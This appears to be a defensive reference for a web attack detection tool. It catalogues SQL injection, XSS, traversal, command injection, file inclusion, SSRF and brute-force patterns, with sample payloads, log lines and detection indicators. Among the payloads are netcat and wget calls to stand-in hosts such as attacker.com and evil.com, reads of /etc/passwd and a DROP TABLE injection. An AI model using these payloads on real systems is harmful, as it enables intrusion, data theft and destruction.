# Web Attack Patterns Reference

This document provides a reference for the attack patterns included in the Wildbox web attack detection use case.

## 📚 Attack Pattern Categories

### 1. SQL Injection (SQLi)

**Description**: Attempts to manipulate database queries by injecting malicious SQL code through user input.

**Common Patterns**:
```
' OR '1'='1
' UNION SELECT username,password FROM users--
'; DROP TABLE products;--
' AND 1=1--
' AND SLEEP(5)--
```

**Example Log Entry**:
```
10.0.0.100 - - [09/Nov/2025:10:05:01 +0000] "GET /products?id=1' OR '1'='1 HTTP/1.1" 200 3456 "-" "Mozilla/5.0"
```

**Detection Indicators**:
- Single or double quotes in parameters
- SQL keywords: `SELECT`, `UNION`, `DROP`, `INSERT`, `UPDATE`, `DELETE`
- Comment syntax: `--`, `/*`, `*/`
- Boolean logic: `OR 1=1`, `AND 1=1`

**Risk Level**: 🔴 Critical

---

### 2. Cross-Site Scripting (XSS)

**Description**: Injection of malicious scripts into web pages viewed by other users.

**Common Patterns**:
```html
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<iframe src=javascript:alert('XSS')>
<svg/onload=alert('XSS')>
<body onload=alert('XSS')>
```

**Example Log Entry**:
```
10.0.0.102 - - [09/Nov/2025:10:15:01 +0000] "GET /search?q=<script>alert('XSS')</script> HTTP/1.1" 200 2345 "-" "Mozilla/5.0"
```

**Detection Indicators**:
- HTML tags in parameters: `<script>`, `<iframe>`, `<img>`, `<svg>`
- JavaScript event handlers: `onerror=`, `onload=`, `onclick=`
- JavaScript protocol: `javascript:`
- Encoded variations: `%3Cscript%3E`, `&lt;script&gt;`

**Risk Level**: 🟠 High

---

### 3. Path Traversal / Directory Traversal

**Description**: Attempts to access files and directories outside the web root directory.

**Common Patterns**:
```
/../../../etc/passwd
/download?file=../../../../etc/shadow
/files/..%2F..%2F..%2Fetc%2Fpasswd
/images/../../../windows/system32/config/sam
```

**Example Log Entry**:
```
10.0.0.101 - - [09/Nov/2025:10:10:01 +0000] "GET /../../../etc/passwd HTTP/1.1" 404 162 "-" "curl/7.68.0"
```

**Detection Indicators**:
- Dot-dot-slash sequences: `../`, `..\\`
- URL-encoded versions: `%2e%2e%2f`, `%2e%2e%5c`
- Attempts to access system files: `/etc/passwd`, `/etc/shadow`, `win.ini`
- Multiple directory traversal attempts

**Risk Level**: 🟠 High

---

### 4. Command Injection

**Description**: Attempts to execute arbitrary system commands on the server.

**Common Patterns**:
```
;cat /etc/passwd
| nc attacker.com 1234
`wget http://evil.com/shell.sh`
$(whoami)
```

**Example Log Entry**:
```
10.0.0.110 - - [09/Nov/2025:10:30:01 +0000] "GET /ping?host=127.0.0.1;cat /etc/passwd HTTP/1.1" 500 234 "-" "curl/7.68.0"
```

**Detection Indicators**:
- Command separators: `;`, `|`, `&&`, `||`
- Command substitution: `` ` ``, `$()`
- Common commands: `cat`, `ls`, `nc`, `wget`, `curl`, `bash`, `sh`
- Redirection operators: `>`, `<`, `>>`

**Risk Level**: 🔴 Critical

---

### 5. Local File Inclusion (LFI)

**Description**: Attempts to include local files from the server, potentially exposing sensitive data.

**Common Patterns**:
```
/page?file=/etc/passwd
/include?file=php://filter/convert.base64-encode/resource=index
/view?file=../../../../../../etc/passwd%00
```

**Example Log Entry**:
```
10.0.0.111 - - [09/Nov/2025:10:35:01 +0000] "GET /page?file=/etc/passwd HTTP/1.1" 403 162 "-" "Mozilla/5.0"
```

**Detection Indicators**:
- Direct file paths: `/etc/passwd`, `/var/log/`, `c:\windows\`
- PHP wrappers: `php://filter`, `php://input`, `data://`
- Null byte injection: `%00`
- Log poisoning attempts

**Risk Level**: 🟠 High

---

### 6. Remote File Inclusion (RFI)

**Description**: Attempts to include remote files, potentially executing malicious code.

**Common Patterns**:
```
/page?file=http://evil.com/shell.txt
/include?url=http://attacker.com/malware.php
```

**Example Log Entry**:
```
10.0.0.112 - - [09/Nov/2025:10:40:01 +0000] "GET /page?file=http://evil.com/shell.txt HTTP/1.1" 403 162 "-" "Mozilla/5.0"
```

**Detection Indicators**:
- External URLs in parameters: `http://`, `https://`, `ftp://`
- Suspicious domains in file parameters
- Common malware file names: `shell`, `backdoor`, `c99`

**Risk Level**: 🔴 Critical

---

### 7. Server-Side Request Forgery (SSRF)

**Description**: Attempts to make the server perform requests to internal/external resources.

**Common Patterns**:
```
/proxy?url=http://localhost/admin
/fetch?url=http://169.254.169.254/latest/meta-data/
/image?src=http://internal-server:8080/secrets
```

**Example Log Entry**:
```
10.0.0.114 - - [09/Nov/2025:10:50:01 +0000] "GET /proxy?url=http://localhost/admin HTTP/1.1" 403 162 "-" "curl/7.68.0"
```

**Detection Indicators**:
- Localhost references: `localhost`, `127.0.0.1`, `[::1]`
- Internal IP ranges: `10.`, `192.168.`, `172.16.` through `172.31.`
- Cloud metadata endpoints: `169.254.169.254`
- Internal domain names

**Risk Level**: 🟠 High

---

### 8. Brute Force Attacks

**Description**: Repeated login attempts to guess credentials.

**Common Patterns**:
- Multiple failed login attempts (401/403 responses)
- Same source IP, multiple attempts
- Automated tools (python-requests, etc.)

**Example Log Entries**:
```
10.0.0.103 - - [09/Nov/2025:10:20:01 +0000] "POST /admin/login HTTP/1.1" 401 234 "-" "python-requests/2.28.0"
10.0.0.103 - - [09/Nov/2025:10:20:02 +0000] "POST /admin/login HTTP/1.1" 401 234 "-" "python-requests/2.28.0"
10.0.0.103 - - [09/Nov/2025:10:20:03 +0000] "POST /admin/login HTTP/1.1" 401 234 "-" "python-requests/2.28.0"
```

**Detection Indicators**:
- 10+ failed auth attempts from same IP
- POST requests to `/login`, `/admin`, `/auth` endpoints
- 401/403 response codes
- Short time intervals between attempts

**Risk Level**: 🟡 Medium

---

### 9. Security Scanner Activity

**Description**: Automated security scanning tools probing for vulnerabilities.

**Common User Agents**:
```
sqlmap/1.7.2#stable
Nikto/2.1.6
Nmap Scripting Engine
Acunetix Web Vulnerability Scanner
WPScan v3.8.22
ZmEu
```

**Example Log Entry**:
```
10.0.0.104 - - [09/Nov/2025:10:25:01 +0000] "GET / HTTP/1.1" 200 1234 "-" "sqlmap/1.7.2#stable (http://sqlmap.org)"
```

**Detection Indicators**:
- Known scanner user agents
- Rapid sequential requests
- Scanning common paths: `/admin`, `/phpmyadmin`, `/wp-admin`
- Pattern-based URL probing

**Risk Level**: 🟡 Medium

---

### 10. Rate Limiting Violations

**Description**: Excessive requests from a single source in a short time period.

**Example Log Entries**:
```
10.0.0.115 - - [09/Nov/2025:10:55:01 +0000] "GET /api/data HTTP/1.1" 200 456 "-" "python-requests/2.28.0"
10.0.0.115 - - [09/Nov/2025:10:55:01 +0000] "GET /api/data HTTP/1.1" 200 456 "-" "python-requests/2.28.0"
10.0.0.115 - - [09/Nov/2025:10:55:01 +0000] "GET /api/data HTTP/1.1" 429 234 "-" "python-requests/2.28.0"
```

**Detection Indicators**:
- Multiple requests with same timestamp
- 429 (Too Many Requests) responses
- Burst patterns from single IP
- Automated client signatures

**Risk Level**: 🟡 Medium

---

## 🎯 Detection Strategy

### Rule-Based Detection

1. **Pattern Matching**: Use regex to identify attack signatures
2. **Threshold-Based**: Count failed attempts, request rates
3. **Blacklist/Whitelist**: Known good/bad IPs, user agents

### Behavioral Detection

1. **Anomaly Detection**: Unusual patterns in normal traffic
2. **Statistical Analysis**: Deviation from baseline behavior
3. **Time-Series Analysis**: Request patterns over time

### AI/ML Detection

1. **Classification**: Categorize requests as benign/malicious
2. **Clustering**: Group similar attack patterns
3. **Sequence Analysis**: Detect multi-stage attacks

## 📊 Response Actions

Based on detected attack type and severity:

| Risk Level | Recommended Action |
|------------|-------------------|
| 🔴 Critical | Immediate IP block, alert SOC, create incident |
| 🟠 High | Rate limit IP, log for analysis, notify admin |
| 🟡 Medium | Log event, increment threat score, monitor |

## 🔗 Additional Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [CWE (Common Weakness Enumeration)](https://cwe.mitre.org/)
- [CVE Database](https://cve.mitre.org/)
